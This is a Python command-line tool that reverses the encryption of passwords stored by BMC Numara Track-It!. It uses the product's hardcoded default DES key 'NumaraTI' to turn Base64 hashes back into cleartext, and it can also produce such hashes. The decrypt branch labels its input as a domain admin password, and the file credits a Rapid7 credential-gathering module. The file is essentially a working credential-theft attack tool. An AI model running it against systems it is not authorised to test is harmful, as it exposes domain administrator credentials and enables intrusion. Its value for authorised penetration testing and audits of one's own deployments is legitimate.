#!/usr/bin/python3.8

# ----------------------------------
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

# Credit:
    # https://gracefulsecurity.com/bmc-numara-track-it-decrypt-pass-tool/
    # https://www.rapid7.com/db/modules/auxiliary/gather/trackit_sql_domain_creds
       
    

import sys # Used by len, exit, etc
import argparse # Parser for command-line options, arguments and sub-commands

banner = """
___ ____ ____ ____ _  _    _ ___   /   ___  ____ ____ ____ _   _ ___  ___
 |  |__/ |__| |    |_/  __ |  |   /    |  \ |___ |    |__/  \_/  |__]  |
 |  |  \ |  | |___ | \_    |  |  .     |__/ |___ |___ |  \   |   |     |

"""

parser = argparse.ArgumentParser(description="Track-It! stores its passwords DES encryption that is then Base64ed  and stored.\n This reverses this encryption process when the default Track-It! key is: 'NumaraTI'")
parser.add_argument('-d', action='store', metavar='b64_hash', help="Track-It Password hash.")
parser.add_argument('-e', action='store', metavar = 'cleartext', help='"flag discreption"')
#parser.add_argument('-p', type=int, choices={636,389}, default=389, help='LDAP port (Default: 389)')

#group = parser.add_mutually_exclusive_group()
#group = parser.add_argument_group('Additional options')

#group.add_argument('-additional-flag', action='store_true', help='Additional flag discription')


if len(sys.argv)==1:
        print( banner )
        parser.print_help()
        sys.exit(1)

options = parser.parse_args()


import base64
from Crypto.Cipher import DES

if options.e is not None:
    cipher_text = options.e
    print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
    print("Cipher Value: ",end='')
    desa = DES.new('NumaraTI', DES.MODE_CBC, 'NumaraTI')
    #print(YELLOW,desa.decode('utf-8'),NOCOLOR)
    print(LIGHTGREEN+"\n[+] "+NOCOLOR, end = '')
    print("Cleartext: ",end='')
    print(RED+options.e+NOCOLOR)
    print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
    print("Trip-It! Hash: ",end='')
    mydes = desa.encrypt(cipher_text)
    print(YELLOW,base64.b64encode(mydes).decode('utf-8'),NOCOLOR)
    #print(YELLOW,desa.encrypt(cipher_text),NOCOLOR)
    print("")
    exit(1)

elif options.d is not None:

    print(LIGHTGREEN+"\n[+] "+NOCOLOR, end = '')
    print("Hash Value: ",end='')
    print(RED+options.d+NOCOLOR)

    DomainAdminPass = options.d

    cipher_text = base64.b64decode(DomainAdminPass)
    desa = DES.new('NumaraTI', DES.MODE_CBC, 'NumaraTI')

    #print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
    #print("Cipher Value: ",end='')
    #print(YELLOW,cipher_text.decode('utf-8'),NOCOLOR)
    try:
        password = desa.decrypt(cipher_text).decode('utf-8')
        print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
        print("Cleartext Value: "+YELLOW+password+NOCOLOR)
    except:
        print(RED+"[+] "+NOCOLOR, end = '')
        print("Probaly not using default key 'NumaraTO'")

    print("")
    exit(1)
else:
    parser.print_help()
    exit(1)

